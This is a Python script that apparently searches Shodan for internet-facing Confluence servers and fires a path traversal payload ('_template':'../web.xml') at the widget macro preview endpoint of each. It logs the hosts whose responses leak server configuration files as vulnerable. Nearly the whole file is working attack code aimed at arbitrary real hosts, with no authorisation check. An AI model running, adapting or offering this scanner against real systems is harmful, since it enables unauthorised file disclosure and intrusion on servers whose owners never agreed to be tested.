#!/usr/bin/env python
#
# Confluence.py
# Search SHODAN for Confluence LFI / RCE
#
# Author: imhunterand

import shodan
import sys
import re
import requests
from time import sleep
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# Configuration
API_KEY = "YOURAPIKEY"
SEARCH_FOR = 'confluence'
FILE = "/rest/tinymce/1/macro/preview"
session = requests.Session()

def filter_result(str):
	str.strip() #trim
	str.lstrip() #ltrim
	str.rstrip() #rtrim
	return str

def grab_file (IP,PORT,FILE):
	print ("[*] Testing: "+IP+" on Port: "+PORT+"[*]\n")
	try:
		
		URL = "https://"+IP+":"+PORT+""+FILE+""
		rawBody = "{\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc511\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"../web.xml\"}}}"
		headers = {"Accept":"*/*","User-Agent":"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)","Connection":"close","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json; charset=utf-8"}
		response = session.post(URL, data=rawBody, headers=headers, verify=False)


		result = response.text
		if 'classpath:/securityContext.xml' in result:
			text_file = open("./cfg/Confluence.cfg", "a")
			text_file.write("https://"+IP+":"+PORT+"\n")
			text_file.close()
			print ("[*] Confluence... Found [*]\n")
			print (result)
		else:
			print ("[*] Not Vulnerable [*]\n ")
	except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
			
	except Exception as e:
		print (e)
		print ("[*] Nothing Found on IP:"+IP+" [*]\n")
	



	
	
try:
        # Setup the api
		api = shodan.Shodan(API_KEY)

        # Perform the search
		result = api.search(SEARCH_FOR)

        # Loop through the matches and print each IP
		for service in result['matches']:
				IP = service['ip_str']
				PORT = str(service['port'])
				CC = service['location']['country_name']
				grab_file (IP,PORT,FILE)
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
